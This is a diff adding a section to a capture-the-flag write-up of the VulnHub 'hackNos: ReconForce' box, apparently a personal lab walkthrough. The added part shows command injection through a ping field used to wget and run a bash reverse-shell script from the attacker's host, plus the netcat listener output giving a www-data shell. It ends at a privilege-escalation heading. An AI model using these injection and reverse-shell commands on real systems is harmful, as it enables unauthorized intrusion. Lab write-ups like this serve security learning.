@@ -22,6 +22,8 @@
   * Theory (.htaccess/.htpasswd)
 * 0x02 Exploitation
   * Login In / Command Injection
+  * Shell as www-data
+* 0x03 Privilege Escalation
   
 # 0x00 Quick Summary
 hackNos: ReconForce was a quite easy box, took me around 1day to root it because i was using the broken version. The mistake takes place at FTP Banner, it should be `Security@hackNos` & not `Secure@hackNos`. I wasted lot of time brute forcing the HTTP Authentication, when i got the patched version i was able to root it into 10 minutes. FTP Banner provide us the HTTP Authentication password, when we login in we can see a ping function, we need to bypass it & take command injection. Then we have to do 2 privilege escalations, very easy ones.
@@ -152,3 +154,39 @@ Nothing really work, there is a filter in the script i guess. A blacklist that b
 ```
 
 We have command injection! `www-data`
+
+## Shell as www-data
+
+I wasn't able to spawn a reverse shell there, tried lot of reverse shells but nothing so i did a trick.
+
+```
+[root@pwn4magic]:~/Documents/vulnhub/hackNosReconForce# touch revshell.sh
+[root@pwn4magic]:~/Documents/vulnhub/hackNosReconForce# echo "bash -i >& /dev/tcp/192.168.1.14/5555 0>&1" > revshell.sh 
+[root@pwn4magic]:~/Documents/vulnhub/hackNosReconForce# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+Now we'll wget it to target, execute it.
+
+```
+127.0.0.1||  wget 192.168.1.14/revshell.sh
+127.0.0.1||  chmod +x revshell.sh
+127.0.0.1||  bash revshell.sh
+```
+
+We have shell.
+
+```
+[root@pwn4magic]:~# nc -lvp 5555
+listening on [any] 5555 ...
+connect to [192.168.1.14] from thepurge [192.168.1.2] 32930
+bash: cannot set terminal process group (1015): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@hacknos:/var/www/recon/5ecure$ whoami
+whoami
+www-data
+www-data@hacknos:/var/www/recon/5ecure$ 
+
+```
+
+# 0x03 Privilege Escalation
